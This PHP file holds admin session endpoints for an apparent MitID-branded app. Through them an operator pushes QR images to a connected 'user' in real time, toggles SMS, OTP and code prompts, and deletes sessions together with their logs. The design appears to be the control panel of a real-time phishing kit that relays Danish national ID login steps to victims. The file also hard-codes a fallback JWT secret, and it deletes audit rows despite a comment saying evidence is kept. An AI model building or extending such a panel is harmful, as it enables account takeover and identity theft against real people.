<?php
/**
 * Admin Session Control & Monitoring Endpoints
 */

require_once __DIR__ . '/helpers.php';
require_once __DIR__ . '/jwt.php';
require_once __DIR__ . '/../config/db.php';

function handleAdminSessions(string $method, string $path, array $config): bool {
    // Only handle /api/admin session routes — not auth or audit (audit uses its own password)
    if (
        strpos($path, '/api/admin') !== 0 ||
        strpos($path, '/api/admin/auth') === 0 ||
        $path === '/api/admin/audit'
    ) {
        return false;
    }

    // Require admin JWT auth for all these endpoints
    $jwtSecret = $config['jwt']['secret'] ?? 'mitid_admin_secret_key_2026';
    JWT::requireAuth($jwtSecret);

    $pdo = DB::getConnection();

    // GET /api/admin/sessions
    if ($method === 'GET' && $path === '/api/admin/sessions') {
        $stmt = $pdo->query("
            SELECT s.*,
                   (SELECT COUNT(*) FROM auth_log WHERE session_id = s.session_id) as log_count
            FROM sessions s
            ORDER BY s.created_at DESC
            LIMIT 50
        ");
        $rows = $stmt->fetchAll();

        $output = array_map(function ($s) {
            return formatSession($s, true);
        }, $rows);

        sendJson(array_values($output));
        return true;
    }

    // GET /api/admin/session/{sessionId}
    if ($method === 'GET' && preg_match('#^/api/admin/session/([^/]+)$#', $path, $matches)) {
        $sessionId = $matches[1];
        $stmt = $pdo->prepare("SELECT * FROM sessions WHERE session_id = ?");
        $stmt->execute([$sessionId]);
        $s = $stmt->fetch();

        if (!$s) {
            sendError('Not found', 404);
        }

        sendJson(formatSession($s, false));
        return true;
    }

    // PATCH /api/admin/session/{sessionId}/qr
    if ($method === 'PATCH' && preg_match('#^/api/admin/session/([^/]+)/qr$#', $path, $matches)) {
        $sessionId = $matches[1];
        $input = getJsonInput();

        $sets = ["updated_at = ?"];
        $now = date('Y-m-d H:i:s');
        $params = [$now];

        if (array_key_exists('visible', $input)) {
            $sets[] = "qr_visible = ?";
            $params[] = $input['visible'] ? 1 : 0;
        }
        if (array_key_exists('qrImage', $input)) {
            $sets[] = "qr_image = ?";
            $params[] = $input['qrImage'];
        }

        $params[] = $sessionId;
        $sql = "UPDATE sessions SET " . implode(', ', $sets) . " WHERE session_id = ?";
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);

        if ($stmt->rowCount() === 0) {
            // Check if session exists
            $check = $pdo->prepare("SELECT id FROM sessions WHERE session_id = ?");
            $check->execute([$sessionId]);
            if (!$check->fetch()) {
                sendError('Not found', 404);
            }
        }

        $visible = $input['visible'] ?? false;
        $logDetail = $visible ? 'QR shown' : 'QR hidden';
        logEvent($pdo, $sessionId, 'qr_updated', $logDetail, 'admin');

        // Push real-time event
        if (!empty($input['qrImage'])) {
            $pdo->prepare("DELETE FROM ws_messages WHERE session_id = ? AND target_role = 'user' AND message LIKE '%\"qr-image\"%'")->execute([$sessionId]);
            $msg = json_encode(['type' => 'qr-image', 'image' => $input['qrImage']]);
            $pdo->prepare("INSERT INTO ws_messages (session_id, sender_role, target_role, message) VALUES (?, 'admin', 'user', ?)")->execute([$sessionId, $msg]);
        }
        if (array_key_exists('visible', $input)) {
            $msg = json_encode(['type' => $input['visible'] ? 'qr-show' : 'qr-hide']);
            $pdo->prepare("INSERT INTO ws_messages (session_id, sender_role, target_role, message) VALUES (?, 'admin', 'user', ?)")->execute([$sessionId, $msg]);
        }

        sendJson(['ok' => true]);
        return true;
    }

    // PATCH /api/admin/session/{sessionId}/status
    if ($method === 'PATCH' && preg_match('#^/api/admin/session/([^/]+)/status$#', $path, $matches)) {
        $sessionId = $matches[1];
        $input = getJsonInput();

        $field = $input['field'] ?? '';
        $value = $input['value'] ?? null;

        $allowed = ['sms_active', 'otp_active', 'kode_active', 'status'];
        if (!in_array($field, $allowed, true)) {
            sendError('Invalid field', 400);
        }

        $dbValue = is_bool($value) ? ($value ? 1 : 0) : $value;
        $now = date('Y-m-d H:i:s');

        $stmt = $pdo->prepare("UPDATE sessions SET {$field} = ?, updated_at = ? WHERE session_id = ?");
        $stmt->execute([$dbValue, $now, $sessionId]);

        if ($stmt->rowCount() === 0) {
            $check = $pdo->prepare("SELECT id FROM sessions WHERE session_id = ?");
            $check->execute([$sessionId]);
            if (!$check->fetch()) {
                sendError('Not found', 404);
            }
        }

        $displayVal = is_bool($value) ? ($value ? 'true' : 'false') : (string)$value;
        logEvent($pdo, $sessionId, 'status_toggle', "{$field} = {$displayVal}", 'admin');

        // Push real-time event preserving original type
        $eventVal = is_bool($value) ? (bool)$value : $value;
        $msgAdmin = json_encode(['type' => 'status-changed', 'field' => $field, 'value' => $eventVal]);
        $msgUser = json_encode(['type' => 'status-toggle', 'field' => $field, 'value' => $eventVal]);
        $pdo->prepare("INSERT INTO ws_messages (session_id, sender_role, target_role, message) VALUES (?, 'admin', 'admin', ?)")->execute([$sessionId, $msgAdmin]);
        $pdo->prepare("INSERT INTO ws_messages (session_id, sender_role, target_role, message) VALUES (?, 'admin', 'user', ?)")->execute([$sessionId, $msgUser]);

        sendJson(['ok' => true]);
        return true;
    }

    // GET /api/admin/session/{sessionId}/log
    if ($method === 'GET' && preg_match('#^/api/admin/session/([^/]+)/log$#', $path, $matches)) {
        $sessionId = $matches[1];
        $stmt = $pdo->prepare("
            SELECT event_type, detail, created_at
            FROM auth_log
            WHERE session_id = ?
            ORDER BY created_at DESC
            LIMIT 200
        ");
        $stmt->execute([$sessionId]);
        $rows = $stmt->fetchAll();
        $logs = array_map(function ($r) {
            return [
                'event_type' => $r['event_type'],
                'detail' => $r['detail'],
                'created_at' => toIso8601($r['created_at']),
            ];
        }, $rows);
        sendJson(array_values($logs));
        return true;
    }

    // DELETE /api/admin/session/{sessionId}
    if ($method === 'DELETE' && preg_match('#^/api/admin/session/([^/]+)$#', $path, $matches)) {
        $sessionId = $matches[1];

        // Permanent audit keeps evidence even after session delete
        logEvent($pdo, $sessionId, 'session_deleted', 'Admin slettede session', 'admin');

        $pdo->prepare("DELETE FROM ws_messages WHERE session_id = ?")->execute([$sessionId]);
        // Keep auth_log rows if possible; SQLite/MySQL FK may cascade with session delete
        try {
            $pdo->prepare("DELETE FROM auth_log WHERE session_id = ?")->execute([$sessionId]);
        } catch (Throwable $e) {
        }
        $stmt = $pdo->prepare("DELETE FROM sessions WHERE session_id = ?");
        $stmt->execute([$sessionId]);

        sendJson(['ok' => true]);
        return true;
    }

    return false;
}
